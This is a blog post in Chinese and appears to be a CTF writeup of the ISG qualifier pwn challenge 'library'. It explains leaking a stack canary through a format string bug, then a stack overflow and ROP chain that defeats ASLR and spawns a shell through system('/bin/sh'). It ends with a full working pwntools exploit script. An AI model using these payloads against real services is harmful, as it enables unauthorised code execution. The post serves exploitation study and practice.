---
title: ISG初赛library
author: rk700
layout: post
categories:
  - writeup
tags:
  - exploit
---

子曰：温故而知新。最近一段时间没有练习pwn的题目，正好当时ISG初赛的library还一直没研究，于是练习了下。果然是稍微放一放就生疏了……

比较明显的问题是在register里，有一个format string attack。但这道题对这里还是有一些限制，比如字符串长度只有15，而且一旦调用过一次就不能再调用了。我最初光考虑这个漏洞了，想好久也没有找到好的方法。因为有ASLR，所以必须先读某个函数的地址，再改got；但是只能调用一次这点限制太严重了，而且15个字符基本上改不了什么。

然后看到query里有一处读输入到栈上的代码，而读的长度是在一个全局变量里保存的，到此才稍微明白了思路：可以改这个全局变量使得读输入溢出，修改返回地址。但在query里还检查了canary，所以我们还需要canary的值，而这个值可以从format string那里得到。由于canary保存在栈上，为了读栈上的内容，用的格式是`%x`，所以要把返回的8 bytes的hex转化为4 bytes的内容。

具体地，改全局变量那里，由于15个字符的限制，只能改一下了，所以可以把全局变量的高位改为非零，这样的话全局变量的值就成了一个大数。

可以修改返回地址后，我又陷入了思维定式，还想再用format string来读函数地址。但正如前面所说，对register有限制；想要修改返回地址为main从头再来，但全局变量那里又需要再改了……最后意识到，一旦可以修改返回地址，就直接rop了，不需要再利用限制那么严格的format string。

于是，用`puts`来打印函数地址。rop最后跳到query里，再一次造成溢出，执行`system`。

{% highlight python %}
#!/usr/bin/env python2

from pwn import *
import sys

if __name__ == '__main__' :
    context(arch='i386', os='linux')

    #libc = ELF('/opt/arch32/usr/lib/libc.so.6')
    systemLibcAddr = 0x3b010#libc.symbols['system']
    #print hex(systemLibcAddr)
    putsLibcAddr = 0x64250#libc.symbols['puts']
    #print hex(putsLibcAddr)
    shStrLibcAddr = 0x15d1b3#next(libc.search('/bin/sh\x00'))
    #print hex(shStrLibcAddr)

    elf = ELF('library')
    putsGot = elf.got['puts']
    putsPlt = elf.plt['puts']

    leftTime = 0x0804b008
    doQuery = 0x08048971

    ip = "127.0.0.1"#sys.argv[1]
    conn = remote(ip, 1111)

    payload = "1\n" + p32(leftTime+1) + "%35$x%10$hn\n"
    conn.send(payload)
    conn.recvuntil("Mr./Mrs. "+p32(leftTime+1))
    canary = int(conn.recvn(8),16)
    #print "canary is %s" % hex(canary)

    payload = "2\n" + "A"*0x100 + p32(canary) + "B"*12 + p32(putsPlt) + p32(doQuery) + p32(putsGot) + "\n"
    conn.send(payload)
    conn.recvuntil(":'(\n")

    putsMemAddr = unpack(conn.recvn(4))
    systemMemAddr = putsMemAddr + (systemLibcAddr - putsLibcAddr)
    shStrMemAddr = putsMemAddr + (shStrLibcAddr-putsLibcAddr)
    #print "system is at %s" % hex(systemMemAddr)
    #print "puts is at %s" % hex(putsMemAddr)
    #print "sh is at %s" % hex(shStrMemAddr)

    payload = "A"*0x100 + p32(canary) + "B"*12 + p32(systemMemAddr) + p32(0xabcdabcd) + p32(shStrMemAddr) + "\n"
    conn.send(payload)

    conn.interactive()
{% endhighlight %}
